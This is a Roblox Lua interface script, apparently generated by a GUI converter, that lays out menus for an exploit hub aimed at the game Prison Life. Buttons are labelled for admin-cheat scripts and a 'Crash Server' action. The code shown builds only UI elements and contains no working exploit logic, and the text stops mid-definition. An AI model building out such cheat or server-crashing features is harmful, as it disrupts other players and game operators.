--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 48 | Scripts: 1 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.Antihub
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["IgnoreGuiInset"] = true;
G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
G2L["1"]["Name"] = [[Antihub]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.Antihub.TitleBar
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["Active"] = true;
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(31, 32, 35);
G2L["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["2"]["Size"] = UDim2.new(0.5, 0, 0.05, 0);
G2L["2"]["Position"] = UDim2.new(0.5, 0, 0.3, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = [[TitleBar]];


-- StarterGui.Antihub.TitleBar.Container
G2L["3"] = Instance.new("CanvasGroup", G2L["2"]);
G2L["3"]["Active"] = true;
G2L["3"]["ZIndex"] = 0;
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(50, 52, 57);
G2L["3"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["3"]["Size"] = UDim2.new(1, 0, 9.5, 0);
G2L["3"]["Position"] = UDim2.new(0.5, 0, 4.75, 0);
G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["Name"] = [[Container]];
G2L["3"]["BackgroundTransparency"] = 0.1;


-- StarterGui.Antihub.TitleBar.Container.UICorner
G2L["4"] = Instance.new("UICorner", G2L["3"]);
G2L["4"]["CornerRadius"] = UDim.new(0.015, 0);


-- StarterGui.Antihub.TitleBar.Container.Container
G2L["5"] = Instance.new("CanvasGroup", G2L["3"]);
G2L["5"]["ZIndex"] = 3;
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["5"]["Size"] = UDim2.new(1, 0, 0.9, 0);
G2L["5"]["Position"] = UDim2.new(0.5, 0, 0.555, 0);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Name"] = [[Container]];
G2L["5"]["BackgroundTransparency"] = 1;


-- StarterGui.Antihub.TitleBar.Container.Container.List
G2L["6"] = Instance.new("CanvasGroup", G2L["5"]);
G2L["6"]["ZIndex"] = 3;
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(31, 32, 35);
G2L["6"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["6"]["Size"] = UDim2.new(0.15, 0, 1, 0);
G2L["6"]["Position"] = UDim2.new(0.075, 0, 0.5, 0);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Name"] = [[List]];
G2L["6"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Antihub.TitleBar.Container.Container.List.PrisonLife
G2L["7"] = Instance.new("TextButton", G2L["6"]);
G2L["7"]["TextWrapped"] = true;
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["TextSize"] = 14;
G2L["7"]["TextScaled"] = true;
G2L["7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/TitilliumWeb.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["7"]["BackgroundTransparency"] = 0.5;
G2L["7"]["Size"] = UDim2.new(1, 0, 0.15, 0);
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["Text"] = [[Prison Life]];
G2L["7"]["Name"] = [[PrisonLife]];
G2L["7"]["Position"] = UDim2.new(0.5, 0, 0.075, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.List.Universal
G2L["8"] = Instance.new("TextButton", G2L["6"]);
G2L["8"]["TextWrapped"] = true;
G2L["8"]["BorderSizePixel"] = 0;
G2L["8"]["TextSize"] = 14;
G2L["8"]["TextScaled"] = true;
G2L["8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/TitilliumWeb.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["8"]["BackgroundTransparency"] = 0.5;
G2L["8"]["Size"] = UDim2.new(1, 0, 0.15, 0);
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Text"] = [[Universal]];
G2L["8"]["Name"] = [[Universal]];
G2L["8"]["Position"] = UDim2.new(0.5, 0, 0.25, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.List.Logs
G2L["9"] = Instance.new("TextButton", G2L["6"]);
G2L["9"]["TextWrapped"] = true;
G2L["9"]["BorderSizePixel"] = 0;
G2L["9"]["TextSize"] = 14;
G2L["9"]["TextScaled"] = true;
G2L["9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/TitilliumWeb.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["9"]["BackgroundTransparency"] = 0.5;
G2L["9"]["Size"] = UDim2.new(1, 0, 0.15, 0);
G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["Text"] = [[Logs]];
G2L["9"]["Name"] = [[Logs]];
G2L["9"]["Position"] = UDim2.new(0.5, 0, 0.425, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.List.AntiCheat
G2L["a"] = Instance.new("TextButton", G2L["6"]);
G2L["a"]["TextWrapped"] = true;
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["TextSize"] = 14;
G2L["a"]["TextScaled"] = true;
G2L["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/TitilliumWeb.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["a"]["BackgroundTransparency"] = 0.5;
G2L["a"]["Size"] = UDim2.new(1, 0, 0.15, 0);
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["Text"] = [[AntiCheat]];
G2L["a"]["Name"] = [[AntiCheat]];
G2L["a"]["Position"] = UDim2.new(0.5, 0, 0.6, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.List.Chat
G2L["b"] = Instance.new("TextButton", G2L["6"]);
G2L["b"]["TextWrapped"] = true;
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["TextSize"] = 14;
G2L["b"]["TextScaled"] = true;
G2L["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/TitilliumWeb.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["b"]["BackgroundTransparency"] = 0.5;
G2L["b"]["Size"] = UDim2.new(1, 0, 0.15, 0);
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["Text"] = [[Chat]];
G2L["b"]["Name"] = [[Chat]];
G2L["b"]["Position"] = UDim2.new(0.5, 0, 0.775, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.Menus
G2L["c"] = Instance.new("Folder", G2L["5"]);
G2L["c"]["Name"] = [[Menus]];


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.Chat
G2L["d"] = Instance.new("CanvasGroup", G2L["c"]);
G2L["d"]["GroupTransparency"] = 1;
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["d"]["Size"] = UDim2.new(0.85, 0, 1, 0);
G2L["d"]["Position"] = UDim2.new(0.575, 0, 0.5, 0);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["Name"] = [[Chat]];
G2L["d"]["BackgroundTransparency"] = 1;


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.Chat.Logs
G2L["e"] = Instance.new("ScrollingFrame", G2L["d"]);
G2L["e"]["Active"] = true;
G2L["e"]["BorderSizePixel"] = 0;
G2L["e"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["e"]["Name"] = [[Logs]];
G2L["e"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["e"]["Size"] = UDim2.new(0.9, 0, 0.8, 0);
G2L["e"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["Position"] = UDim2.new(0.5, 0, 0.425, 0);
G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.Chat.Logs.Chat
G2L["f"] = Instance.new("TextLabel", G2L["e"]);
G2L["f"]["TextWrapped"] = true;
G2L["f"]["BorderSizePixel"] = 0;
G2L["f"]["TextSize"] = 16;
G2L["f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["f"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f"]["FontFace"] = Font.new([[rbxasset://fonts/families/TitilliumWeb.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f"]["BackgroundTransparency"] = 1;
G2L["f"]["RichText"] = true;
G2L["f"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f"]["Text"] = [[]];
G2L["f"]["Name"] = [[Chat]];
G2L["f"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.Chat.Input
G2L["10"] = Instance.new("TextBox", G2L["d"]);
G2L["10"]["Name"] = [[Input]];
G2L["10"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["TextWrapped"] = true;
G2L["10"]["TextSize"] = 14;
G2L["10"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["TextScaled"] = true;
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/TitilliumWeb.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10"]["MultiLine"] = true;
G2L["10"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["10"]["ClearTextOnFocus"] = false;
G2L["10"]["PlaceholderText"] = [[Press To Chat]];
G2L["10"]["Size"] = UDim2.new(0.7, 0, 0.1, 0);
G2L["10"]["Position"] = UDim2.new(0.475, 0, 0.9, 0);
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Text"] = [[]];
G2L["10"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.Chat.Send
G2L["11"] = Instance.new("TextButton", G2L["d"]);
G2L["11"]["TextWrapped"] = true;
G2L["11"]["BorderSizePixel"] = 0;
G2L["11"]["TextSize"] = 14;
G2L["11"]["TextScaled"] = true;
G2L["11"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["11"]["Size"] = UDim2.new(0.05, 0, 0.1, 0);
G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["Text"] = [[^]];
G2L["11"]["Name"] = [[Send]];
G2L["11"]["Position"] = UDim2.new(0.875, 0, 0.9, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.Chat.Send.UICorner
G2L["12"] = Instance.new("UICorner", G2L["11"]);
G2L["12"]["CornerRadius"] = UDim.new(0.125, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.PrisonLife
G2L["13"] = Instance.new("CanvasGroup", G2L["c"]);
G2L["13"]["BorderSizePixel"] = 0;
G2L["13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["13"]["Size"] = UDim2.new(0.85, 0, 1, 0);
G2L["13"]["Position"] = UDim2.new(0.575, 0, 0.5, 0);
G2L["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13"]["Name"] = [[PrisonLife]];
G2L["13"]["BackgroundTransparency"] = 1;


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.PrisonLife.Prizz
G2L["14"] = Instance.new("TextButton", G2L["13"]);
G2L["14"]["TextWrapped"] = true;
G2L["14"]["BorderSizePixel"] = 0;
G2L["14"]["TextSize"] = 14;
G2L["14"]["TextScaled"] = true;
G2L["14"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["14"]["Size"] = UDim2.new(0.185, 0, 0.1, 0);
G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["Text"] = [[Prizzlife]];
G2L["14"]["Name"] = [[Prizz]];
G2L["14"]["Position"] = UDim2.new(0.16, 0, 0.225, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.PrisonLife.Prizz.UICorner
G2L["15"] = Instance.new("UICorner", G2L["14"]);
G2L["15"]["CornerRadius"] = UDim.new(0.125, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.PrisonLife.H4X
G2L["16"] = Instance.new("TextButton", G2L["13"]);
G2L["16"]["TextWrapped"] = true;
G2L["16"]["BorderSizePixel"] = 0;
G2L["16"]["TextSize"] = 14;
G2L["16"]["TextScaled"] = true;
G2L["16"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["16"]["Size"] = UDim2.new(0.185, 0, 0.1, 0);
G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["Text"] = [[H4X Admin]];
G2L["16"]["Name"] = [[H4X]];
G2L["16"]["Position"] = UDim2.new(0.37, 0, 0.225, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.PrisonLife.H4X.UICorner
G2L["17"] = Instance.new("UICorner", G2L["16"]);
G2L["17"]["CornerRadius"] = UDim.new(0.125, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.PrisonLife.Tiger
G2L["18"] = Instance.new("TextButton", G2L["13"]);
G2L["18"]["TextWrapped"] = true;
G2L["18"]["BorderSizePixel"] = 0;
G2L["18"]["TextSize"] = 14;
G2L["18"]["TextScaled"] = true;
G2L["18"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["18"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["18"]["Size"] = UDim2.new(0.185, 0, 0.1, 0);
G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18"]["Text"] = [[Tiger Admin]];
G2L["18"]["Name"] = [[Tiger]];
G2L["18"]["Position"] = UDim2.new(0.58, 0, 0.225, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.PrisonLife.Tiger.UICorner
G2L["19"] = Instance.new("UICorner", G2L["18"]);
G2L["19"]["CornerRadius"] = UDim.new(0.125, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.PrisonLife.PWare
G2L["1a"] = Instance.new("TextButton", G2L["13"]);
G2L["1a"]["TextWrapped"] = true;
G2L["1a"]["BorderSizePixel"] = 0;
G2L["1a"]["TextSize"] = 14;
G2L["1a"]["TextScaled"] = true;
G2L["1a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["1a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["1a"]["Size"] = UDim2.new(0.185, 0, 0.1, 0);
G2L["1a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a"]["Text"] = [[PrisonWare]];
G2L["1a"]["Name"] = [[PWare]];
G2L["1a"]["Position"] = UDim2.new(0.8, 0, 0.225, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.PrisonLife.PWare.UICorner
G2L["1b"] = Instance.new("UICorner", G2L["1a"]);
G2L["1b"]["CornerRadius"] = UDim.new(0.125, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.PrisonLife.Crash
G2L["1c"] = Instance.new("TextButton", G2L["13"]);
G2L["1c"]["TextWrapped"] = true;
G2L["1c"]["BorderSizePixel"] = 0;
G2L["1c"]["TextSize"] = 14;
G2L["1c"]["TextScaled"] = true;
G2L["1c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["1c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1c"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["1c"]["Size"] = UDim2.new(0.25, 0, 0.15, 0);
G2L["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c"]["Text"] = [[Crash Server]];
G2L["1c"]["Name"] = [[Crash]];
G2L["1c"]["Position"] = UDim2.new(0.5, 0, 0.827, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.PrisonLife.Crash.UICorner
G2L["1d"] = Instance.new("UICorner", G2L["1c"]);
G2L["1d"]["CornerRadius"] = UDim.new(0.125, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.Universal
G2L["1e"] = Instance.new("CanvasGroup", G2L["c"]);
G2L["1e"]["GroupTransparency"] = 1;
G2L["1e"]["BorderSizePixel"] = 0;
G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["1e"]["Size"] = UDim2.new(0.85, 0, 1, 0);
G2L["1e"]["Position"] = UDim2.new(0.575, 0, 0.5, 0);
G2L["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e"]["Name"] = [[Universal]];
G2L["1e"]["BackgroundTransparency"] = 1;


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.Universal.TextLabel
G2L["1f"] = Instance.new("TextLabel", G2L["1e"]);
G2L["1f"]["TextWrapped"] = true;
G2L["1f"]["BorderSizePixel"] = 0;
G2L["1f"]["TextSize"] = 14;
G2L["1f"]["TextScaled"] = true;
G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["FontFace"] = Font.new([[rbxasset://fonts/families/TitilliumWeb.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1f"]["TextColor3"] = Color3.fromRGB(179, 179, 179);
G2L["1f"]["BackgroundTransparency"] = 1;
G2L["1f"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["1f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f"]["Text"] = [[Universal In Progress]];
G2L["1f"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.Logs
G2L["20"] = Instance.new("CanvasGroup", G2L["c"]);
G2L["20"]["GroupTransparency"] = 1;
G2L["20"]["BorderSizePixel"] = 0;
G2L["20"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["20"]["Size"] = UDim2.new(0.85, 0, 1, 0);
G2L["20"]["Position"] = UDim2.new(0.575, 0, 0.5, 0);
G2L["20"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20"]["Name"] = [[Logs]];
G2L["20"]["BackgroundTransparency"] = 1;


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.Logs.Chat
G2L["21"] = Instance.new("ScrollingFrame", G2L["20"]);
G2L["21"]["Active"] = true;
G2L["21"]["BorderSizePixel"] = 0;
G2L["21"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["21"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["21"]["Name"] = [[Chat]];
G2L["21"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["21"]["Size"] = UDim2.new(0.4, 0, 0.8, 0);
G2L["21"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["Position"] = UDim2.new(0.275, 0, 0.5, 0);
G2L["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.Logs.Chat.Log
G2L["22"] = Instance.new("TextLabel", G2L["21"]);
G2L["22"]["TextWrapped"] = true;
G2L["22"]["BorderSizePixel"] = 0;
G2L["22"]["TextSize"] = 16;
G2L["22"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["22"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["22"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["22"]["FontFace"] = Font.new([[rbxasset://fonts/families/TitilliumWeb.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["22"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["22"]["BackgroundTransparency"] = 1;
G2L["22"]["RichText"] = true;
G2L["22"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["22"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["22"]["Text"] = [[]];
G2L["22"]["Name"] = [[Log]];
G2L["22"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.Logs.CL
G2L["23"] = Instance.new("TextLabel", G2L["20"]);
G2L["23"]["TextWrapped"] = true;
G2L["23"]["BorderSizePixel"] = 0;
G2L["23"]["TextSize"] = 14;
G2L["23"]["TextScaled"] = true;
G2L["23"]["BackgroundColor3"] = Color3.fromRGB(51, 51, 51);
G2L["23"]["FontFace"] = Font.new([[rbxasset://fonts/families/TitilliumWeb.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["23"]["TextColor3"] = Color3.fromRGB(179, 179, 179);
G2L["23"]["BackgroundTransparency"] = 0.5;
G2L["23"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["23"]["Size"] = UDim2.new(0.4, 0, 0.05, 0);
G2L["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23"]["Text"] = [[Chat Logs]];
G2L["23"]["Name"] = [[CL]];
G2L["23"]["Position"] = UDim2.new(0.275, 0, 0.075, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.Logs.PL
G2L["24"] = Instance.new("TextLabel", G2L["20"]);
G2L["24"]["TextWrapped"] = true;
G2L["24"]["BorderSizePixel"] = 0;
G2L["24"]["TextSize"] = 14;
G2L["24"]["TextScaled"] = true;
G2L["24"]["BackgroundColor3"] = Color3.fromRGB(51, 51, 51);
G2L["24"]["FontFace"] = Font.new([[rbxasset://fonts/families/TitilliumWeb.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["24"]["TextColor3"] = Color3.fromRGB(179, 179, 179);
G2L["24"]["BackgroundTransparency"] = 0.5;
G2L["24"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["24"]["Size"] = UDim2.new(0.4, 0, 0.05, 0);
G2L["24"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["24"]["Text"] = [[Join/Leave Logs]];
G2L["24"]["Name"] = [[PL]];
G2L["24"]["Position"] = UDim2.new(0.725, 0, 0.075, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.Logs.Player
G2L["25"] = Instance.new("ScrollingFrame", G2L["20"]);
G2L["25"]["Active"] = true;
G2L["25"]["BorderSizePixel"] = 0;
G2L["25"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["25"]["Name"] = [[Player]];
G2L["25"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["25"]["Size"] = UDim2.new(0.4, 0, 0.8, 0);
G2L["25"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["Position"] = UDim2.new(0.725, 0, 0.5, 0);
G2L["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.Logs.Player.Log
G2L["26"] = Instance.new("TextLabel", G2L["25"]);
G2L["26"]["TextWrapped"] = true;
G2L["26"]["BorderSizePixel"] = 0;
G2L["26"]["TextSize"] = 16;
G2L["26"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["26"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["26"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26"]["FontFace"] = Font.new([[rbxasset://fonts/families/TitilliumWeb.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["26"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26"]["BackgroundTransparency"] = 1;
G2L["26"]["RichText"] = true;
G2L["26"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["26"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["26"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26"]["Text"] = [[]];
G2L["26"]["Name"] = [[Log]];
G2L["26"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.AntiCheat
G2L["27"] = Instance.new("CanvasGroup", G2L["c"]);
G2L["27"]["GroupTransparency"] = 1;
G2L["27"]["BorderSizePixel"] = 0;
G2L["27"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["27"]["Size"] = UDim2.new(0.85, 0, 1, 0);
G2L["27"]["Position"] = UDim2.new(0.575, 0, 0.5, 0);
G2L["27"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27"]["Name"] = [[AntiCheat]];
G2L["27"]["BackgroundTransparency"] = 1;


-- StarterGui.Antihub.TitleBar.Container.Container.Menus.AntiCheat.TextLabel
G2L["28"] = Instance.new("TextLabel", G2L["27"]);
G2L["28"]["TextWrapped"] = true;
G2L["28"]["BorderSizePixel"] = 0;
G2L["28"]["TextSize"] = 14;
G2L["28"]["TextScaled"] = true;
G2L["28"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28"]["FontFace"] = Font.new([[rbxasset://fonts/families/TitilliumWeb.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["28"]["TextColor3"] = Color3.fromRGB(179, 179, 179);
G2L["28"]["BackgroundTransparency"] = 1;
